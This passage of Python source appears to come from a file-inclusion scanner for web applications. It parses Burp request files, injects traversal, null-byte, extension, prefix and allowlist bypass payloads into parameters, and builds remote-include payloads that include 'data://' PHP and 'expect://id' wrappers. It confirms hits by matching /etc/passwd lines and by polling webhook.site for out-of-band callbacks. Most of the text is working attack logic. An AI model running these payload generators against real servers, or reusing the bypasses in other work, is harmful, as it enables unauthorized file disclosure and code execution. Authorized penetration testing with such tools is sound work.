                host_header = m.group(1)
    
    if not host_header:
        port_match = _re.search(r':(\d+)', filepath) if filepath else None
        if port_match:
            host_header = f"127.0.0.1:{port_match.group(1)}"
        else:
            host_header = '127.0.0.1'
    
    scheme = 'http'
    host_lower = host_header.lower()
    if (headers.get('X-Forwarded-Proto', '').lower() == 'https' or
        ':443' in host_lower or
        host_lower.endswith(':443')):
        scheme = 'https'
    
    if raw_path.startswith('/'):
        full_path = raw_path
    else:
        full_path = '/' + raw_path if not raw_path.startswith('/') else raw_path
    
    full_url = f"{scheme}://{host_header}{full_path}"
    
    cookies = {}
    cookie_header = headers.get('Cookie', '')
    for pair in cookie_header.split(';'):
        pair = pair.strip()
        if '=' in pair:
            ck, _, cv = pair.partition('=')
            cookies[ck.strip()] = cv.strip()
    
    return {
        'method': method,
        'url': full_url,
        'headers': headers,
        'body': body,
        'cookies': cookies,
    }

def _parse_burp_xml(xml_text, fallback_host='', filepath=''):
    import re as _re
    import base64 as _b64
    from urllib.parse import urlparse as _up
    
    xml_text = _re.sub(r'xmlns="[^"]*"', '', xml_text)
    xml_text = _re.sub(r'xmlns:\w+="[^"]*"', '', xml_text)
    
    items_raw = _re.findall(r'<item[^>]*>(.*?)</item>', xml_text, _re.DOTALL)
    
    if not items_raw:
        if '<request' in xml_text:
            items_raw = [xml_text]
    
    if not items_raw:
        return None
    
    results = []
    for item_xml in items_raw:
        xml_host = ''
        xml_port = ''
        xml_protocol = 'http'
        
        host_match = _re.search(r'<host[^>]*>(.*?)</host>', item_xml, _re.DOTALL)
        if host_match:
            xml_host = host_match.group(1).strip()
        
        port_match = _re.search(r'<port[^>]*>(.*?)</port>', item_xml, _re.DOTALL)
        if port_match:
            xml_port = port_match.group(1).strip()
        
        proto_match = _re.search(r'<protocol[^>]*>(.*?)</protocol>', item_xml, _re.DOTALL)
        if proto_match:
            xml_protocol = proto_match.group(1).strip().lower()
        
        path_match = _re.search(r'<path[^>]*>(.*?)</path>', item_xml, _re.DOTALL)
        xml_path = ''
        if path_match:
            xml_path = path_match.group(1).strip()
            if xml_path.startswith('<![CDATA[') and xml_path.endswith(']]>'):
                xml_path = xml_path[9:-3]
        
        req_matches = _re.findall(r'<request[^>]*>(.*?)</request>', item_xml, _re.DOTALL)
        raw_req = None
        is_b64 = False
        
        for req_content in req_matches:
            cdata_match = _re.search(r'<!\[CDATA\[(.*?)\]\]>', req_content, _re.DOTALL)
            if cdata_match:
                req_content = cdata_match.group(1)
            
            b64_attr = _re.search(r'base64="(true|false)"', item_xml)
            if b64_attr:
                is_b64 = b64_attr.group(1) == 'true'
            
            if is_b64:
                try:
                    clean_b64 = ''.join(req_content.split())
                    raw_req = _b64.b64decode(clean_b64).decode('utf-8', errors='replace')
                except:
                    raw_req = req_content
            else:
                raw_req = req_content
        
        if not raw_req:
            direct_match = _re.search(r'<request[^>]*>(.*?)</request>', xml_text, _re.DOTALL)
            if direct_match:
                raw_req = direct_match.group(1)
                if raw_req.startswith('<!['):
                    raw_req = _re.sub(r'<!\[CDATA\[(.*?)\]\]>', r'\1', raw_req, flags=_re.DOTALL)
        
        if not raw_req:
            continue
        
        parsed = _parse_raw_http(raw_req, fallback_host=fallback_host, filepath=filepath)
        if not parsed:
            continue
        
        scheme = 'https' if (xml_protocol == 'https' or xml_port == '443') else 'http'
        host_port = xml_host
        if xml_port and xml_port not in ('80', '443'):
            host_port = f"{xml_host}:{xml_port}"
        
        if xml_host and xml_path:
            full_path = xml_path
            if not full_path.startswith('/'):
                full_path = '/' + full_path
            parsed['url'] = f"{scheme}://{host_port}{full_path}"
        
        results.append(parsed)
    
    if not results:
        return None
    return results[0] if len(results) == 1 else results

def parse_burp_request(filepath, fallback_host=''):
    try:
        with open(filepath, 'rb') as f:
            raw_bytes = f.read()
    except Exception as e:
        warn('Cannot read ' + filepath + ': ' + str(e))
        return None
    
    try:
        raw_text = raw_bytes.decode('utf-8')
    except UnicodeDecodeError:
        raw_text = raw_bytes.decode('latin-1', errors='replace')
    
    stripped = raw_text.lstrip()
    
    is_xml = (stripped.startswith('<?xml') or 
              stripped.startswith('<items') or 
              stripped.startswith('<item') or 
              ('<request' in stripped and '</request>' in stripped))
    
    if is_xml:
        return _parse_burp_xml(raw_text, fallback_host=fallback_host, filepath=filepath)
    
    return _parse_raw_http(raw_text, fallback_host=fallback_host, filepath=filepath)

# ─── URL/REQUEST MANIPULATION FUNCTIONS ─────────────────────────────────────

def extract_url_params(url):
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    return [(k, v[0]) for k, v in params.items()]

def inject_url_param(url, param, payload):
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))

def extract_path_segments(url):
    parsed = urlparse(url)
    segments = [s for s in parsed.path.split("/") if s and "." in s or len(s) > 2]
    return segments

def inject_path_segment(url, segment_index, payload):
    parsed = urlparse(url)
    parts = parsed.path.split("/")
    non_empty = [i for i, p in enumerate(parts) if p]
    if segment_index >= len(non_empty):
        return url
    real_idx = non_empty[segment_index]
    parts[real_idx] = quote(payload, safe="")
    new_path = "/".join(parts)
    return urlunparse(parsed._replace(path=new_path))

def extract_body_params(body):
    params = {}
    if not body:
        return params
    try:
        data = json.loads(body)
        if isinstance(data, dict):
            return {k: str(v) for k, v in data.items()}
    except Exception:
        pass
    try:
        qs = parse_qs(body, keep_blank_values=True)
        return {k: v[0] for k, v in qs.items()}
    except Exception:
        pass
    return params

def inject_body_param(body, param, payload):
    try:
        data = json.loads(body)
        if isinstance(data, dict):
            data[param] = payload
            return json.dumps(data)
    except Exception:
        pass
    qs = parse_qs(body, keep_blank_values=True)
    qs[param] = [payload]
    return urlencode(qs, doseq=True)

def extract_prefix_candidates(original_value):
    BS = chr(92)
    v = original_value.strip()
    prefixes = []
    
    is_linux = v.startswith("/") and len(v) > 1
    is_windows = (len(v) > 2 and v[1] == ":") or v.startswith(BS + BS)
    
    if not (is_linux or is_windows):
        return []
    
    if is_linux:
        parts = [p for p in v.split("/") if p]
        prefixes.append("")
        built = ""
        for part in parts[:-1]:
            built += "/" + part
            prefixes.append(built)
        full_dir = v[: v.rfind("/")] if "/" in v else ""
        if full_dir and full_dir not in prefixes:
            prefixes.append(full_dir)
    
    if is_windows:
        norm = v.replace("/", BS)
        stripped = norm.lstrip(BS)
        parts = [p for p in stripped.split(BS) if p]
        prefixes.append("")
        built = ""
        for part in parts[:-1]:
            built = (built + BS + part) if built else (BS + BS + part)
            prefixes.append(built)
    
    seen, out = set(), []
    for p in prefixes:
        if p not in seen:
            seen.add(p)
            out.append(p)
    return out

def build_prefix_bypass_payloads(prefix, lfi_payloads):
    BS = chr(92)
    results = []
    seen = set()
    traversal_starts = ("..", "%2e", "%c0", "%25", "....//", BS + BS)
    
    for payload in lfi_payloads:
        is_traversal = any(payload.startswith(s) for s in traversal_starts)
        if not is_traversal:
            continue
        sep = "/" if not prefix.startswith(BS) else BS
        combined = (prefix + sep + payload) if prefix else payload
        if combined not in seen:
            seen.add(combined)
            results.append(combined)
        if "%00" not in combined and prefix:
            nb = prefix + "%00" + sep + payload
            if nb not in seen:
                seen.add(nb)
                results.append(nb)
    return results

def detect_extension(value):
    import os as _os
    _, ext = _os.path.splitext(value.split("?")[0].split("#")[0])
    return ext.lower() if ext else ""

def build_extension_bypass_payloads(traversal_payloads, extension):
    ext = extension or ".jpg"
    results = []
    seen = set()
    
    def add(p):
        if p not in seen:
            seen.add(p)
            results.append(p)
    
    for payload in traversal_payloads:
        if any(payload.startswith(s) for s in ("php://", "data://", "expect://", "file://")):
            continue
        add(payload + "%00" + ext)
        add(payload + "%00." + ext.lstrip("."))
        add(payload + chr(0) + ext)
        add(payload + "." * 500 + ext)
        add(payload + "/" * 500 + ext)
        add(payload + "/." * 250 + ext)
        add(payload + ".php" + ext)
        add(payload + ext)
        add(payload + "%2e" + ext.lstrip("."))
        add(payload + "%252e" + ext.lstrip("."))
        add(payload + ext + ".php")
        add(payload + "A" * 64 + ext)
    
    return results

def build_extension_prefix_combined(prefixes, traversal_payloads, extension):
    results = []
    seen = set()
    ext = extension or ".jpg"
    BS = chr(92)
    
    for prefix in (prefixes or [""]):
        sep = "/" if not prefix.startswith(BS) else BS
        for payload in traversal_payloads:
            if any(payload.startswith(s) for s in ("php://","data://","expect://","file://")):
                continue
            base = (prefix + sep + payload) if prefix else payload
            p = base + "%00" + ext
            if p not in seen:
                seen.add(p); results.append(p)
            p = base + ext
            if p not in seen:
                seen.add(p); results.append(p)
            p = base + "." * 200 + ext
            if p not in seen:
                seen.add(p); results.append(p)
    
    return results

def detect_allowlist_candidates(original_value):
    v = original_value.strip()
    if not v:
        return False
    if ".." in v or "%2e%2e" in v.lower() or "%252e" in v.lower():
        return False
    return True

def build_allowlist_bypass_payloads(original_value, lfi_payloads):
    v = original_value.strip()
    results = []
    seen = set()
    
    def add(p):
        if p not in seen:
            seen.add(p)
            results.append(p)
    
    traversal_payloads = [
        p for p in lfi_payloads
        if p.startswith("..") or p.startswith("%2e") or p.startswith("%c0")
    ]
    
    for payload in traversal_payloads:
        add(v + "%00" + payload)
        add(v + "%00/" + payload)
        add(v + "%00" + chr(92) + payload)
        add(v + "%00.php" + payload)
        add(v + "%00.php/" + payload)
        add(v + "/" + payload)
        add(v + chr(92) + payload)
        add(v + ".php/" + payload)
        add(v + ".php" + chr(92) + payload)
        add(v + "?" + payload)
        add(v + "?file=" + payload)
        add(v + "#" + payload)
        add(v + "%23" + payload)
        add(v + "%2f" + payload)
        add(v + "%5c" + payload)
        add(v + "//" + payload)
        add(v + ".php//" + payload)
        add("./" + v + "/" + payload)
        add("./" + v + "%00" + payload)
    
    for wrapper in [
        "php://filter/convert.base64-encode/resource=" + v,
        "php://filter/read=convert.base64-encode/resource=" + v,
        "php://filter/convert.iconv.UTF-8.UTF-16/resource=" + v,
    ]:
        add(wrapper)
    
    return results

# ─── DECODER ─────────────────────────────────────────────────────────────────

ENCODING_LABELS = {
    "base64": "Base64",
    "base64url": "Base64-URL",
    "hex": "Hex",
    "url": "URL-encoded",
    "html": "HTML-entities",
    "rot13": "ROT13",
    "unicode": "Unicode-escape",
    "zlib_b64": "zlib+Base64",
}

def _try_base64(text):
    import base64 as _b64
    chunks = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', text)
    for chunk in sorted(chunks, key=len, reverse=True):
        try:
            padded = chunk + "=" * (-len(chunk) % 4)
            decoded = _b64.b64decode(padded).decode("utf-8", errors="strict")
            if len(decoded) > 10:
                return decoded
        except Exception:
            pass
    return None

def _try_base64url(text):
    import base64 as _b64
    chunks = re.findall(r'[A-Za-z0-9\-_]{20,}={0,2}', text)
    for chunk in sorted(chunks, key=len, reverse=True):
        try:
            padded = chunk + "=" * (-len(chunk) % 4)
            decoded = _b64.urlsafe_b64decode(padded).decode("utf-8", errors="strict")
            if len(decoded) > 10:
                return decoded
        except Exception:
            pass
    return None

def _try_hex(text):
    chunks = re.findall(r'(?:[0-9a-fA-F]{2}){12,}', text)
    for chunk in sorted(chunks, key=len, reverse=True):
        try:
            decoded = bytes.fromhex(chunk).decode("utf-8", errors="strict")
            if len(decoded) > 6 and decoded.isprintable():
                return decoded
        except Exception:
            pass
    return None

def _try_url(text):
    from urllib.parse import unquote as _uq
    if text.count("%") < 3:
        return None
    try:
        decoded = _uq(text)
        if decoded != text and len(decoded) > 10:
            return decoded
    except Exception:
        pass
    return None

def _try_html(text):
    import html as _html
    if "&" not in text:
        return None
    try:
        decoded = _html.unescape(text)
        if decoded != text and len(decoded) > 10:
            return decoded
    except Exception:
        pass
    return None

def _try_rot13(text):
    import codecs
    try:
        decoded = codecs.decode(text, "rot_13")
        printable = sum(1 for c in decoded if c.isprintable())
        if printable / max(len(decoded), 1) > 0.9 and len(decoded) > 10:
            return decoded
    except Exception:
        pass
    return None

def _try_zlib_b64(text):
    import base64 as _b64, zlib
    chunks = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', text)
    for chunk in sorted(chunks, key=len, reverse=True):
        try:
            padded = chunk + "=" * (-len(chunk) % 4)
            raw = _b64.b64decode(padded)
            decoded = zlib.decompress(raw).decode("utf-8", errors="strict")
            if len(decoded) > 10:
                return decoded
        except Exception:
            pass
    return None

def _try_unicode(text):
    if "\\u" not in text and "\\x" not in text:
        return None
    try:
        decoded = text.encode("utf-8").decode("unicode_escape")
        if decoded != text and len(decoded) > 10:
            return decoded
    except Exception:
        pass
    return None

DECODERS = [
    ("base64", _try_base64),
    ("base64url", _try_base64url),
    ("zlib_b64", _try_zlib_b64),
    ("hex", _try_hex),
    ("url", _try_url),
    ("html", _try_html),
    ("rot13", _try_rot13),
    ("unicode", _try_unicode),
]

def auto_decode(text, max_passes=3):
    current = text
    layers = []
    for _ in range(max_passes):
        found = False
        for enc_name, fn in DECODERS:
            result = fn(current)
            if result and result != current:
                layers.append(enc_name)
                current = result
                found = True
                break
        if not found:
            break
    if layers:
        return current, layers
    return None, []

def decode_and_print(resp_text, poc_url, param_label, payload, vuln_type):
    decoded, layers = auto_decode(resp_text)
    if not decoded:
        return None
    label_str = " -> ".join(ENCODING_LABELS.get(l, l) for l in layers)
    W = 72
    BR = Fore.MAGENTA
    print()
    print(BR + "+" + "=" * W + "+" + Style.RESET_ALL)
    title = " DECODED OUTPUT  [" + label_str + "] "
    pad   = max(0, W - len(title))
    print(BR + "|" + Style.BRIGHT + title + Style.RESET_ALL + " " * pad + BR + "|" + Style.RESET_ALL)
    print(BR + "+" + "=" * W + "+" + Style.RESET_ALL)
    resp_lines = decoded.splitlines()
    for line in resp_lines[:40]:
        display = line[:W - 2] if len(line) > W - 2 else line
        spaces  = max(0, W - len(display))
        print(BR + "|" + Style.RESET_ALL + " " + Fore.WHITE + display + Style.RESET_ALL + " " * spaces + BR + "|" + Style.RESET_ALL)
    if len(resp_lines) > 40:
        note   = " ... (" + str(len(resp_lines) - 40) + " more lines — save with -o report.json) "
        npad   = max(0, W - len(note))
        print(BR + "|" + Fore.YELLOW + note + Style.RESET_ALL + " " * npad + BR + "|" + Style.RESET_ALL)
    print(BR + "+" + "=" * W + "+" + Style.RESET_ALL)
    print()
    return decoded

def _extract_snippet(text, matched_sig, max_lines=40):
    resp_lines = text.splitlines()
    for i, line in enumerate(resp_lines):
        if re.search(matched_sig, line, re.IGNORECASE):
            start = max(0, i - 2)
            end   = min(len(resp_lines), i + max_lines)
            return "\n".join(resp_lines[start:end])
    return "\n".join(resp_lines[:max_lines])

def _print_plain_snippet(snippet):
    W  = 72
    BR = Fore.MAGENTA
    print()
    print(BR + "+" + "=" * W + "+" + Style.RESET_ALL)
    title = " LEAKED CONTENT  [Plain Text] "
    pad   = max(0, W - len(title))
    print(BR + "|" + Style.BRIGHT + title + Style.RESET_ALL + " " * pad + BR + "|" + Style.RESET_ALL)
    print(BR + "+" + "=" * W + "+" + Style.RESET_ALL)
    for line in snippet.splitlines():
        display = line[:W - 2] if len(line) > W - 2 else line
        spaces  = max(0, W - len(display))
        print(BR + "|" + Style.RESET_ALL + " " + Fore.WHITE + display + Style.RESET_ALL + " " * spaces + BR + "|" + Style.RESET_ALL)
    print(BR + "+" + "=" * W + "+" + Style.RESET_ALL)
    print()

def check_response(resp_text, vuln_type="LFI"):
    sigs = LFI_SIGNATURES if vuln_type == "LFI" else RFI_SIGNATURES
    
    if vuln_type == "LFI":
        passwd_patterns = [
            r'root:.*?:0:0:',
            r'root:x:0:0:',
            r'daemon:.*?:1:1:',
            r'bin:x:1:1:',
            r'sys:x:2:2:',
            r'adm:x:3:4:',
            r'www-data:x:33:33:',
            r'nobody:x:65534:',
        ]
        for pattern in passwd_patterns:
            if re.search(pattern, resp_text, re.IGNORECASE):
                return True, f"Passwd content matched: {pattern}", resp_text, []
    
    for sig in sigs:
        if re.search(sig, resp_text, re.IGNORECASE):
            return True, sig, resp_text, []
    
    decoded, layers = auto_decode(resp_text)
    if decoded:
        for sig in sigs:
            if re.search(sig, decoded, re.IGNORECASE):
                return True, sig, decoded, layers
    
    return False, None, resp_text, []

def check_error_leakage(resp_text):
    for sig in ERROR_SIGNATURES:
        if re.search(sig, resp_text, re.IGNORECASE):
            return True, sig
    return False, None

def build_rfi_payloads(server_url):
    from urllib.parse import urlparse as _up
    base = server_url.rstrip("/")
    p = _up(base)
    host = p.netloc
    path = p.path if p.path and p.path != "/" else ""
    scheme = p.scheme or "http"
    
    payloads = [
        f"{scheme}://{host}{path}",
        f"{scheme.upper()}://{host}{path}",
        f"//{host}{path}",
        f"{scheme}://{host}{path}%00",
        f"{scheme}://{host}{path}%00.php",
        f"{scheme}://{host}{path}?",
        f"{scheme}://{host}{path}#",
        f"hTtP://{host}{path}",
        f"HTTP://{host}{path}",
        f"http%3a%2f%2f{host}{path}",
        f"data://text/plain,<?php phpinfo();?>",
        f"expect://id",
    ]
    return payloads

def expand_custom_payload(raw):
    p = raw.strip()
    if not p or p.startswith("#"):
        return []
    variants = [p]
    if "%00" not in p and "\\x00" not in p:
        variants += [p+"%00", p+"%00.php", p+"%00.html", p+"%00index.php"]
    if "%25" not in p and ("/" in p or "." in p):
        d = p.replace("/", "%252f").replace(".", "%252e")
        if d != p:
            variants += [d, d+"%00"]
    if "../" in p:
        u = p.replace("../", "%c0%ae%c0%ae/")
        variants += [u, u+"%00"]
    if "../" in p and "%2f" not in p.lower():
        e1 = p.replace("../", "..%2f")
        variants += [e1, e1+"%00", p.replace("../", "%2e%2e%2f")]
    if "../" in p:
        variants += [p.replace("../", "....//"), p.replace("../", "..//")]
    variants += [p + "." * 500, p + "/." * 250]
    if "/" in p:
        win = p.replace("/", "\\\\")
        variants += [win, win+"%00", p.replace("/", "%5C"), p.replace("/", "%5C")+"%00"]
    seen, out = set(), []
    for v in variants:
        if v not in seen:
            seen.add(v)
            out.append(v)
    return out

def load_custom_payloads(filepath, expand=True):
    raw_lines = []
    with open(filepath, "r", errors="replace") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                raw_lines.append(line)
    if not expand:
        return raw_lines
    expanded, seen = [], set()
    for raw in raw_lines:
        for v in expand_custom_payload(raw):
            if v not in seen:
                seen.add(v)
                expanded.append(v)
    return expanded

# ─── SCANNER CLASS ──────────────────────────────────────────────────────────

class Scanner:
    def __init__(self, args):
        self.args = args
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = args.timeout
        if args.proxy:
            self.session.proxies = {"http": args.proxy, "https": args.proxy}
        import threading
        self.findings = []
        self.scanned = 0
        self._findings_lock = threading.Lock()
        self._stop_event = threading.Event()
        self.delay = args.delay
        
        self.lfi_payloads = list(LFI_PAYLOADS)
        if getattr(args, "lfi_payloads_file", None):
            extra = load_custom_payloads(args.lfi_payloads_file,
                                         expand=not getattr(args, "no_expand", False))
            self.lfi_payloads += extra
        
        rfi_server = getattr(args, "rfi_server", None)
        if rfi_server:
            self.rfi_payloads = build_rfi_payloads(rfi_server)
        else:
            self.rfi_payloads = []
        
        if getattr(args, "rfi_payloads_file", None):
            extra_rfi = load_custom_payloads(args.rfi_payloads_file,
                                              expand=not getattr(args, "no_expand", False))
            self.rfi_payloads += extra_rfi
        
        self.rfi_token = getattr(args, "rfi_token", None) or "RFIPROBE_OK"
        self.webhook_id = getattr(args, "rfi_webhook_id", None)
        self._seen_webhook_requests = set()

    def _check_webhook(self, fired_url):
        if not self.webhook_id:
            return None
        import urllib.request as _ur
        api = "https://webhook.site/token/" + self.webhook_id + "/requests?sorting=newest&per_page=5"
        try:
            with _ur.urlopen(api, timeout=6) as r:
                data = json.loads(r.read().decode())
            for req in data.get("data", []):
                rid = req.get("uuid", "")
                if rid in self._seen_webhook_requests:
                    continue
                self._seen_webhook_requests.add(rid)
                method = req.get("method", "?")
                ip = req.get("ip", "?")
                created = req.get("created_at", "?")
                return f"{method} from {ip} at {created}"
        except Exception:
            pass
        return None

    def request(self, method, url, headers=None, cookies=None, body=None):
        try:
            h = dict(headers or {})
            h.setdefault("User-Agent", "Mozilla/5.0 (Security Scanner)")
            for skip in ["Content-Length", "Host", "Transfer-Encoding"]:
                h.pop(skip, None)
            if method == "GET":
                r = self.session.get(url, headers=h, cookies=cookies or {},
                                     allow_redirects=True)
            elif method == "POST":
                r = self.session.post(url, headers=h, cookies=cookies or {},
                                      data=body, allow_redirects=True)
            else:
                r = self.session.request(method, url, headers=h,
                                          cookies=cookies or {}, data=body)
            if self.delay:
                time.sleep(self.delay)
            return r
        except Exception:
            return None

    def record(self, finding):
        with self._findings_lock:
            self.findings.append(finding)

    def _inc_scanned(self):
        with self._findings_lock:
            self.scanned += 1

    def probe(self, method, url, headers, cookies, body,
              inject_fn, param_label, payload, vuln_type):
        if self._stop_event.is_set():
            return

        try:
            if method == "GET":
                test_url = inject_fn(payload)
                test_body = body
            else:
                test_url = url
                test_body = inject_fn(payload)

            resp = self.request(method, test_url, headers, cookies, test_body)
            if resp is None:
                return

            # RFI
            if vuln_type == "RFI":
                if self.rfi_token in resp.text:
                    vuln("RFI CONFIRMED | " + param_label + " | Payload: " + payload[:60])
                    vuln("    Token '" + self.rfi_token + "' found in response body")
                    vuln("    URL: " + test_url)
                    raw_snip = resp.text[:500].strip()
                    self.record({"type": "RFI", "severity": "HIGH",
                                 "param": param_label, "payload": payload,
                                 "url": test_url,
                                 "signature": "token:" + self.rfi_token,
                                 "status": resp.status_code,
                                 "raw_output": raw_snip,
                                 "decoded": None, "encoding": [],
                                 "encoding_label": "Plain Text (token match)"})
                    return
                if self.webhook_id:
                    wh_hit = self._check_webhook(test_url)
                    if wh_hit:
                        vuln("RFI CONFIRMED (webhook.site) | " + param_label + " | " + payload[:60])
                        vuln("    Incoming request received at webhook.site")
                        vuln("    URL: " + test_url)
                        self.record({"type": "RFI", "severity": "HIGH",
                                     "param": param_label, "payload": payload,
                                     "url": test_url,
                                     "signature": "webhook.site OOB callback",
                                     "status": resp.status_code,
                                     "raw_output": wh_hit,
                                     "decoded": None, "encoding": [],
                                     "encoding_label": "OOB (webhook.site)"})
                        return
                hit, sig, _, layers = check_response(resp.text, "RFI")
                if hit:
                    enc_label = " -> ".join(ENCODING_LABELS.get(l,l) for l in layers) if layers else "Plain Text"
                    vuln("RFI (wrapper) CONFIRMED | " + param_label + " | " + payload[:60])
                    vuln("    Signature : " + sig)
                    decoded_out = decode_and_print(resp.text, test_url, param_label, payload, vuln_type)
                    raw_snip = resp.text[:500].strip()
                    self.record({"type": "RFI", "severity": "HIGH",
                                 "param": param_label, "payload": payload,
                                 "url": test_url, "signature": sig,
                                 "status": resp.status_code,
                                 "raw_output": raw_snip,
                                 "decoded": decoded_out, "encoding": layers,
                                 "encoding_label": enc_label})
                return

            # LFI
            hit, sig, text_used, layers = check_response(resp.text, "LFI")
            leak, esig = check_error_leakage(resp.text)

            if hit:
                enc_label = " -> ".join(ENCODING_LABELS.get(l,l) for l in layers) if layers else "Plain Text"
                vuln("LFI CONFIRMED | " + param_label + " | Payload: " + payload[:60])
                vuln("    Signature : " + sig)
                vuln("    URL       : " + test_url)

                decoded_out = None
                raw_snip = resp.text[:500].strip()

                if layers:
                    decoded_out = decode_and_print(resp.text, test_url, param_label, payload, vuln_type)
                    vuln("    Decoded from: " + enc_label)
                else:
                    snippet = _extract_snippet(resp.text, sig)
                    if snippet:
                        _print_plain_snippet(snippet)
                        decoded_out = snippet

                self.record({"type": "LFI", "severity": "HIGH",
                             "param": param_label, "payload": payload,
                             "url": test_url, "signature": sig,
                             "status": resp.status_code,
                             "raw_output": raw_snip,
                             "decoded": decoded_out, "encoding": layers,
                             "encoding_label": enc_label})

            elif leak:
                error_leak("Error disclosure | " + param_label + " | " + payload[:60])
                error_leak("    Pattern: " + esig)
                self.record({"type": "ERROR-DISCLOSURE", "severity": "LOW",
                             "param": param_label, "payload": payload,
                             "url": test_url, "signature": esig,
                             "status": resp.status_code,
                             "raw_output": resp.text[:300].strip(),
                             "decoded": None, "encoding": [],
                             "encoding_label": "N/A"})
        except Exception as _probe_err:
            pass
        finally:
            self._inc_scanned()

    def scan_target(self, target):
        method = target.get("method", "GET").upper()
        url = target["url"]
        headers = target.get("headers", {})
        cookies = target.get("cookies", {})
        body = target.get("body", "")
        
        info("Scanning: [" + method + "] " + url)
        if cookies:
            info("  Auth: " + str(len(cookies)) + " cookie(s) -> " + ", ".join(cookies.keys()))
        
        payloads_to_use = []
        if not self.args.rfi_only:
            payloads_to_use += [("LFI", p) for p in self.lfi_payloads]
        if not self.args.lfi_only:
            payloads_to_use += [("RFI", p) for p in self.rfi_payloads]
        
        jobs = []
        
        for pname, pval in extract_url_params(url):
            for vtype, payload in payloads_to_use:
                def make_url_inject(u=url, p=pname):
                    return lambda pl: inject_url_param(u, p, pl)
                jobs.append((method, url, headers, cookies, body,
                             make_url_inject(), "PARAM:" + pname, payload, vtype))
            
            if not self.args.rfi_only:
                prefixes = extract_prefix_candidates(pval)
                if prefixes:
                    for prefix in prefixes:
                        bp_list = build_prefix_bypass_payloads(prefix, self.lfi_payloads)
                        for bp in bp_list:
                            def make_pfx_inject(u=url, p=pname):
                                return lambda pl: inject_url_param(u, p, pl)
                            jobs.append((method, url, headers, cookies, body,
                                         make_pfx_inject(),
                                         "PREFIX-BYPASS:" + pname + " [" + (prefix or "<empty>") + "]",
                                         bp, "LFI"))
                
                ext = detect_extension(pval)
                if ext:
                    ext_list = build_extension_bypass_payloads(self.lfi_payloads, ext)
                    for ep in ext_list:
                        def make_ext_inject(u=url, p=pname):
                            return lambda pl: inject_url_param(u, p, pl)
                        jobs.append((method, url, headers, cookies, body,
                                     make_ext_inject(),
                                     "EXT-BYPASS:" + pname + " [endswith=" + ext + "]",
                                     ep, "LFI"))
                    
                    if prefixes:
                        combined_list = build_extension_prefix_combined(
                            prefixes, self.lfi_payloads, ext
                        )
                        for cp in combined_list:
                            def make_comb_inject(u=url, p=pname):
                                return lambda pl: inject_url_param(u, p, pl)
                            jobs.append((method, url, headers, cookies, body,
                                         make_comb_inject(),
                                         "COMBINED-BYPASS:" + pname + " [" + ext + "]",
                                         cp, "LFI"))
                
                if detect_allowlist_candidates(pval):
                    al_list = build_allowlist_bypass_payloads(pval, self.lfi_payloads)
                    for ap in al_list:
                        def make_al_inject(u=url, p=pname):
                            return lambda pl: inject_url_param(u, p, pl)
                        jobs.append((method, url, headers, cookies, body,
                                     make_al_inject(),
                                     "ALLOWLIST-BYPASS:" + pname + " [base=" + pval[:20] + "]",
                                     ap, "LFI"))
        
        if self.args.path_scan:
            segs = extract_path_segments(url)
            for idx in range(len(segs)):
                for vtype, payload in payloads_to_use:
                    def make_path_inject(u=url, i=idx):
                        return lambda pl: inject_path_segment(u, i, pl)
                    jobs.append((method, url, headers, cookies, body,
                                 make_path_inject(),
                                 "PATH_SEG:" + segs[idx], payload, vtype))
        
        if method in ("POST", "PUT", "PATCH") and body:
            for pname in extract_body_params(body):
                for vtype, payload in payloads_to_use:
                    def make_body_inject(b=body, p=pname):
                        return lambda pl: inject_body_param(b, p, pl)
                    jobs.append((method, url, headers, cookies, body,
                                 make_body_inject(),
                                 "BODY:" + pname, payload, vtype))
        
        if not jobs:
            warn("  No injectable points found for " + url)
            return
        
        total = len(jobs)
        info("  -> " + str(total) + " probes across " + 
             str(len(set(j[6] for j in jobs))) + " injection points")
        
        done = 0
        findings_before = len(self.findings)
        
        def _render_bar(done, total, vulns, width=40):
            CR = chr(13)
            pct = done / max(total, 1)
            filled = int(width * pct)
            bar = '#' * filled + '-' * (width - filled)
            vs = (' [' + Fore.RED + Style.BRIGHT + 'VULN:' + str(vulns) + Style.RESET_ALL + ']') if vulns else ''
            sys.stderr.write(CR + '  [' + bar + '] ' + str(done).rjust(len(str(total))) + '/' + str(total) + 
                           ' (' + str(int(pct * 100)).rjust(3) + '%)' + vs + '   ')
            sys.stderr.flush()
        
        _render_bar(0, total, 0)
        
        with ThreadPoolExecutor(max_workers=self.args.threads) as ex:
            futs = [ex.submit(self.probe, *j) for j in jobs]
            try:
                for _ in as_completed(futs):
                    if self._stop_event.is_set():
                        for f in futs:
                            f.cancel()
                        break
                    done += 1
                    vulns = len(self.findings) - findings_before
                    _render_bar(done, total, vulns)
            except Exception:
                pass
        
        sys.stderr.write(chr(13) + ' ' * 80 + chr(13))
        sys.stderr.flush()
        vuln_count = len(self.findings) - findings_before
        if vuln_count:
            ok("  Completed: " + str(total) + " probes | " +
               Fore.RED + Style.BRIGHT + str(vuln_count) + " finding(s)" + Style.RESET_ALL)
        else:
            ok("  Completed: " + str(total) + " probes | no findings")

    def collect_targets(self):
        targets = []
        if self.args.urls_file:
            targets += self.load_urls_file(self.args.urls_file)
        if self.args.burp_dir:
            targets += self.load_burp_dir(self.args.burp_dir)
        if self.args.url:
            method = (self.args.method or "GET").upper()
            cookies = {}
            if self.args.cookies:
                for pair in self.args.cookies.split(";"):
                    pair = pair.strip()
                    if "=" in pair:
                        k, _, v = pair.partition("=")
                        cookies[k.strip()] = v.strip()
            targets.append({"method": method, "url": self.args.url,
                             "headers": {}, "cookies": cookies,
                             "body": self.args.data or ""})
        return targets

    def load_urls_file(self, path):
        targets = []
        with open(path) as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                targets.append({"method": "GET", "url": line,
                                 "headers": {}, "cookies": {}, "body": ""})
        return targets

    def load_burp_dir(self, dirpath):
        targets = []
        files = list(Path(dirpath).glob("*"))
        ext_ok = {".txt", ".req", ".request", ".http", ".xml", ""}
        for f in sorted(files):
            if f.suffix.lower() not in ext_ok and f.suffix != "":
                continue
            try:
                if getattr(self.args, "debug_burp", False):
                    print()
